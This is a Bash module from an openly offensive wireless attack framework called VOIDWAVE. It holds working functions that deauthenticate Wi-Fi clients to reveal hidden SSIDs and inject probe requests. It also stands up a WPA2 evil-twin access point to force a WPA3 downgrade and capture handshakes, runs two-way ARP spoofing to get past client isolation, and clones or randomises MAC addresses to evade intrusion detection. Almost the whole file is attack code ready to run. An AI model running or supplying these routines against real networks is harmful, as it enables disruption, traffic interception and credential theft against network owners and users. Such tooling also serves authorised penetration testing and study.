#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════════════════
# VOIDWAVE - Offensive Security Framework
# ═══════════════════════════════════════════════════════════════════════════════
# Copyright (c) 2025 Nerds489
# SPDX-License-Identifier: Apache-2.0
#
# Advanced Features: Hidden SSID reveal, WPA3 downgrade, client isolation bypass
# ═══════════════════════════════════════════════════════════════════════════════

# Prevent multiple sourcing
[[ -n "${_VOIDWAVE_ADVANCED_LOADED:-}" ]] && return 0
readonly _VOIDWAVE_ADVANCED_LOADED=1

# Source dependencies
if ! declare -F log_info &>/dev/null; then
    source "${BASH_SOURCE%/*}/../core.sh"
fi

[[ -f "${BASH_SOURCE%/*}/../wireless/mac.sh" ]] && source "${BASH_SOURCE%/*}/../wireless/mac.sh"

#═══════════════════════════════════════════════════════════════════════════════
# HIDDEN SSID DETECTION
#═══════════════════════════════════════════════════════════════════════════════

# Scan for hidden networks
# Args: $1 = interface, $2 = channel (optional)
hidden_scan() {
    local iface="$1"
    local channel="${2:-}"

    log_info "Scanning for hidden networks..."

    local scan_file
    scan_file=$(mktemp)

    local cmd=(airodump-ng -w "$scan_file" --output-format csv)
    [[ -n "$channel" ]] && cmd+=(-c "$channel")
    cmd+=("$iface")

    timeout 30 "${cmd[@]}" &>/dev/null

    # Parse for hidden SSIDs (length > 0 but no visible name)
    local hidden_count=0

    if [[ -f "${scan_file}-01.csv" ]]; then
        while IFS=',' read -r bssid _ _ channel _ _ _ _ _ essid_len essid _; do
            bssid=$(echo "$bssid" | tr -d ' ')
            essid=$(echo "$essid" | tr -d ' ')
            essid_len=$(echo "$essid_len" | tr -d ' ')

            # Hidden network: has BSSID but empty/hidden ESSID
            if [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                if [[ -z "$essid" || "$essid" == "<length:" || "$essid_len" -gt 0 && -z "$essid" ]]; then
                    ((hidden_count++)) || true
                    echo "HIDDEN: $bssid (Channel: $channel, ESSID Length: $essid_len)"
                fi
            fi
        done < <(tail -n +3 "${scan_file}-01.csv" 2>/dev/null | head -50)

        rm -f "${scan_file}"* 2>/dev/null
    fi

    log_info "Found $hidden_count hidden network(s)"
    return 0
}

# Reveal hidden SSID by deauthing clients
# Args: $1 = interface, $2 = target BSSID, $3 = channel
hidden_reveal_deauth() {
    local iface="$1"
    local target_bssid="$2"
    local channel="$3"

    log_info "Attempting to reveal hidden SSID for $target_bssid"
    log_info "Method: Deauth clients to capture probe responses"

    # Set channel
    iwconfig "$iface" channel "$channel" 2>/dev/null

    # Start capture
    local cap_file
    cap_file=$(mktemp)

    airodump-ng --bssid "$target_bssid" -c "$channel" -w "$cap_file" \
        --output-format csv "$iface" &>/dev/null &
    local capture_pid=$!

    sleep 2

    # Deauth to force reconnections
    aireplay-ng -0 5 -a "$target_bssid" "$iface" &>/dev/null

    sleep 10

    kill "$capture_pid" 2>/dev/null
    wait "$capture_pid" 2>/dev/null

    # Check for revealed SSID
    if [[ -f "${cap_file}-01.csv" ]]; then
        local essid
        essid=$(grep "$target_bssid" "${cap_file}-01.csv" 2>/dev/null | head -1 | cut -d',' -f14 | tr -d ' ')

        rm -f "${cap_file}"* 2>/dev/null

        if [[ -n "$essid" && "$essid" != "<length:" ]]; then
            log_success "SSID Revealed: $essid"
            echo "$essid"
            return 0
        fi
    fi

    log_warning "Could not reveal SSID (no clients or SSID truly hidden)"
    return 1
}

# Reveal hidden SSID via probe request injection
# Args: $1 = interface, $2 = target BSSID, $3 = channel, $4 = wordlist
hidden_reveal_probe() {
    local iface="$1"
    local target_bssid="$2"
    local channel="$3"
    local wordlist="$4"

    if [[ ! -f "$wordlist" ]]; then
        log_error "Wordlist not found: $wordlist"
        return 1
    fi

    log_info "Probing for hidden SSID using wordlist"

    iwconfig "$iface" channel "$channel" 2>/dev/null

    while IFS= read -r ssid; do
        [[ -z "$ssid" || "$ssid" =~ ^# ]] && continue

        # Send probe request
        # This requires mdk3/mdk4 probe mode or custom injection
        if command -v mdk4 &>/dev/null; then
            local probe_file
            probe_file=$(mktemp)
            echo "$ssid" > "$probe_file"

            timeout 2 mdk4 "$iface" p -t "$target_bssid" -f "$probe_file" &>/dev/null

            rm -f "$probe_file"
        fi

    done < "$wordlist"

    log_info "Probe scan complete - check airodump-ng for revealed SSID"
}

#═══════════════════════════════════════════════════════════════════════════════
# WPA3 DOWNGRADE ATTACKS
#═══════════════════════════════════════════════════════════════════════════════

# Check if network supports WPA3
# Args: $1 = interface, $2 = target BSSID, $3 = channel
wpa3_check() {
    local iface="$1"
    local target_bssid="$2"
    local channel="$3"

    log_info "Checking WPA3 support for $target_bssid"

    iwconfig "$iface" channel "$channel" 2>/dev/null

    local scan_file
    scan_file=$(mktemp)

    timeout 10 airodump-ng --bssid "$target_bssid" -c "$channel" -w "$scan_file" \
        --output-format csv "$iface" &>/dev/null

    if [[ -f "${scan_file}-01.csv" ]]; then
        local auth
        auth=$(grep "$target_bssid" "${scan_file}-01.csv" 2>/dev/null | cut -d',' -f6 | tr -d ' ')

        rm -f "${scan_file}"* 2>/dev/null

        if [[ "$auth" =~ SAE || "$auth" =~ WPA3 ]]; then
            log_info "Network uses WPA3 (SAE)"
            echo "wpa3"
            return 0
        elif [[ "$auth" =~ OWE ]]; then
            log_info "Network uses OWE (Enhanced Open)"
            echo "owe"
            return 0
        fi
    fi

    log_info "Network does not appear to use WPA3"
    echo "wpa2"
    return 1
}

# WPA3 transition mode downgrade
# Args: $1 = interface, $2 = target SSID, $3 = channel
wpa3_downgrade_transition() {
    local iface="$1"
    local target_ssid="$2"
    local channel="$3"

    log_info "Attempting WPA3 transition mode downgrade"
    log_info "Creating WPA2-only Evil Twin to force downgrade"

    # This works when AP is in WPA3 transition mode (WPA2+WPA3)
    # By creating a stronger WPA2-only signal, clients may connect to it

    if ! command -v hostapd &>/dev/null; then
        log_error "hostapd required for downgrade attack"
        return 1
    fi

    local conf_file
    conf_file=$(mktemp)

    cat > "$conf_file" << EOF
interface=$iface
driver=nl80211
ssid=$target_ssid
hw_mode=g
channel=$channel
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
wpa_passphrase=12345678
EOF

    log_warning "Starting WPA2 Evil Twin - will capture handshakes from downgraded clients"

    hostapd "$conf_file" &
    local hostapd_pid=$!

    sleep 2

    if kill -0 "$hostapd_pid" 2>/dev/null; then
        log_success "WPA2 downgrade AP running"
        log_info "Capture handshakes with airodump-ng"
        echo "$hostapd_pid"
        return 0
    fi

    rm -f "$conf_file"
    return 1
}

# Dragonblood attack check (CVE-2019-9494, CVE-2019-9496)
# Args: $1 = target BSSID
wpa3_dragonblood_check() {
    local target_bssid="$1"

    log_info "Checking for Dragonblood vulnerabilities"
    log_warning "This is a passive check only"

    # Dragonblood vulnerabilities:
    # - CVE-2019-9494: Cache-based side-channel attack
    # - CVE-2019-9496: Denial of service

    # Active exploitation requires specialized tools
    log_info "For active testing, use:"
    log_info "  - dragonslayer: https://github.com/vanhoefm/dragonslayer"
    log_info "  - dragondrain: https://github.com/vanhoefm/dragondrain-and-time"

    return 0
}

#═══════════════════════════════════════════════════════════════════════════════
# CLIENT ISOLATION BYPASS
#═══════════════════════════════════════════════════════════════════════════════

# Check for client isolation
# Args: $1 = interface, $2 = target client IP
isolation_check() {
    local iface="$1"
    local target_ip="$2"

    log_info "Checking client isolation to $target_ip"

    if ping -c 1 -W 2 "$target_ip" &>/dev/null; then
        log_success "No client isolation - target reachable"
        return 0
    else
        log_warning "Client isolation may be enabled"
        return 1
    fi
}

# ARP spoofing for isolation bypass
# Args: $1 = interface, $2 = gateway IP, $3 = target IP
isolation_arp_spoof() {
    local iface="$1"
    local gateway="$2"
    local target="$3"

    if ! command -v arpspoof &>/dev/null; then
        log_error "arpspoof not found (install dsniff)"
        return 1
    fi

    log_warning "Starting ARP spoof to bypass isolation"
    log_info "Gateway: $gateway, Target: $target"

    # Enable IP forwarding
    echo 1 > /proc/sys/net/ipv4/ip_forward

    # ARP spoof both directions
    arpspoof -i "$iface" -t "$target" "$gateway" &>/dev/null &
    local pid1=$!

    arpspoof -i "$iface" -t "$gateway" "$target" &>/dev/null &
    local pid2=$!

    log_success "ARP spoof running (PIDs: $pid1, $pid2)"
    echo "$pid1 $pid2"
}

#═══════════════════════════════════════════════════════════════════════════════
# ROGUE AP DETECTION EVASION
#═══════════════════════════════════════════════════════════════════════════════

# Randomize AP characteristics to evade WIDS
# Args: $1 = interface
evasion_randomize() {
    local iface="$1"

    log_info "Randomizing AP characteristics for WIDS evasion"

    # Randomize MAC
    if declare -F mac_randomize &>/dev/null; then
        mac_randomize "$iface"
    fi

    # Random timing variations would go here
    # (beacon interval jitter, etc.)

    log_success "AP characteristics randomized"
}

# Clone legitimate AP characteristics
# Args: $1 = interface, $2 = target BSSID, $3 = channel
evasion_clone_ap() {
    local iface="$1"
    local target_bssid="$2"
    local channel="$3"

    log_info "Cloning AP characteristics from $target_bssid"

    # Clone MAC address
    if declare -F mac_clone &>/dev/null; then
        mac_clone "$iface" "$target_bssid"
    fi

    # Set same channel
    iwconfig "$iface" channel "$channel" 2>/dev/null

    log_success "AP characteristics cloned"
}

#═══════════════════════════════════════════════════════════════════════════════
# EXPORTS
#═══════════════════════════════════════════════════════════════════════════════

export -f hidden_scan hidden_reveal_deauth hidden_reveal_probe
export -f wpa3_check wpa3_downgrade_transition wpa3_dragonblood_check
export -f isolation_check isolation_arp_spoof
export -f evasion_randomize evasion_clone_ap
